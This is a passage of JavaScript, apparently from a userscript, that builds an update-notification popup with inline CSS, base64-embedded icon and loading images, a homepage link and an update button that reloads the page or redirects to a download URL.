    '.hkpopup .hkclose:hover { color: #06D85F; }.hkpopup .hkcontent { max-height: 30%; overflow: auto; width: 100% !important;} @media screen and (max-width: 780px){ .hkpopup{ width: 96%;max-width:45em;    display: block; } }</style>'+
      '<div id="hoakhuyapop" class="hkoverlay">'+
      '<div class="hkpopup">'+
      '<h2 style="font-size: '+h2fontsize+'px !important;margin: 8px 0;font-weight: 700;line-height: 1.1;display: block;"><img  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAoCAYAAACM/rhtAAAACXBIWXMAAAsTAAALEwEAmpwYAAAC5UlEQVRYhe2YXUhTYRjHf8/O3Fz2SSmYBAlBse4qKUhzXXgR5YaIBF1EN3VTF91UdwVRdxlFGCURiNCFSqUmBFYOS1C6ij6IoMgwsqybPtTNbU8XpdvZztZya5PYHwbnfc7/fd/fznPel/M+Qj7VPtAIUkWYCxzwjFtZbLlmmtWGS10HgS7QE6uC35/Q8dxh5csb4KTDaJ69/uwqKWt8PXjSypcXQFfb/Yp3i5YviY19crr2WHnt2Z5cm9wOpktrQSsRWzRtIo+le2AEYMppFDGjpn4Bwxolq4Dqq3YTMO5gk0qQ+LtngREA9taOrr1668PbkhXls3cdkdDltAG1rq4E18wXUzAcckvfozdJ4UBQewdC5R//iYj+aOnbVPVl7PakUbRm9dTXa/3HD7WmDcjyGSGI0xQz7KnfV69nM8LGRHKdBEZ//+Y0cXj3+ARsA3ieYthsptgMp6qoHGPacUX6+3/Em7Whphw1og+haPqjdA5P/UvAxaaWcEd6/M1JvBAxeoHNc+1A8S7gbrwtm9uMeVWovMrGoHnbqNPVggfM+B3Ues9RBA9o/N7nU69n3VxLIh3SPXgj54AIWxB8CRuzsA6IAmJ7Np/h//8Uo3QCL4GtCHti4kPEbhsqD+czfMaA0uvvBrrV6zkCxH6RDEuP/0ym4y/4FBcAM1UBMFMVADNVATBTFQCTSjWtufP5BJelY/qbjwW/ej2hX5eR09IzeH0eUFGJmAEFtbKlDyhUzF1HbEvniQWA7qouBVaag/LdypufFBv27QmxsLy1smbvXKyRINhiDugaSOoVbTAdEZQx6Xvw/i8AS6cITzQkncAuTxPm7B1sBSzrK7FS344aVPbFAd9M5o8vQf0zaZPbQbBsP6rnEYnWBpUQ4dD6ZIWprNcHkyqwwgl6EZFFprhyLlXVLGeLRHqGvoHEp/IexZ9OpeqX21UstEUb2k74m086XwRzypBKCjb11bZo/c7adPv8BPgtz7eOAKh8AAAAAElFTkSuQmCC" style=" vertical-align: middle; margin-right: 5px;    display: inline;" /><span data-tag="NEW_REQUIRED_DLB"></span></h2>'+
      '<a onclick="localStorage.setItem(\'update_remind\', parseInt(Math.floor(Date.now() / 1000))+42300);" class="hkclose" href="#hoakhuyapop">×</a>'+
      '<div class="hkcontent" style="display: inline-block;color:#000;font-size: 12px !important;line-height: 1.5;">'+
      '<span  data-tag="NEW_REQUIRED_T1"></span> #<u>'+nowversion+'</u>. <span  data-tag="NEW_REQUIRED_T2"></span>'+
      '<h3 style="display: block;background-color: #1e1e1e;color: #ccc;font-size: 1.1em;font-weight: 700;line-height: 1;margin: 0;padding: 21x;text-transform: uppercase;position: relative;margin-top: 10px;padding: 10px;"><span  data-tag="CHANGE_ELOG"></span> #<u>'+newversion+'</u></h3>'+
      '<div class="c5d8v2cd" style="background-color: #1e1e1e;font-size: 1.05em !important;font-weight: 600;color: goldenrod;line-height: 1.2;padding: 21px;position: relative;margin-top: 1px;font-family: monospace;">'+
      ''+newupdatetxt+
      '<div>'+
      '<div style="margin-top: 20px; text-align: right;margin-right: 20px;"><button onclick="window.open(\'http://lfj.io/?ref=1/\', \'_blank\')" class="hkbutton" style="vertical-align:middle;background-color: #607d8b;"><span class="hkbutton0">'+HLANG.HOMEPAGE+'</span></button> <button onclick="try{if(document.getElementsByClassName(\'hkbutton1\')[0].innerHTML.match(/(refresh|刷新|tải\\slại)/gim).length==1){location.reload();}} catch(e){document.getElementsByClassName(\'loadingimg\')[0].style.display=\'inline\';document.getElementsByClassName(\'hkbutton1\')[0].innerHTML=\''+HLANG.ONDOWNLOAD+'\';setTimeout(function(){window.location.href=\''+updateurli+'\';document.getElementsByClassName(\'hkbutton1\')[0].innerHTML=\''+HLANG.OPEN_WINDOW+'\';document.getElementsByClassName(\'loadingimg\')[0].style.display=\'none\';}, 1500);setTimeout(function(){document.getElementsByClassName(\'hkbutton1\')[0].innerHTML=\''+HLANG.REFESH+'\';}, 6000);}; " class="hkbutton" style="vertical-align:middle"><span class="hkbutton1">'+HLANG.UPNOW+'</span><img class="loadingimg" style="vertical-align: middle; display: none;" src="data:image/gif;base64,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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA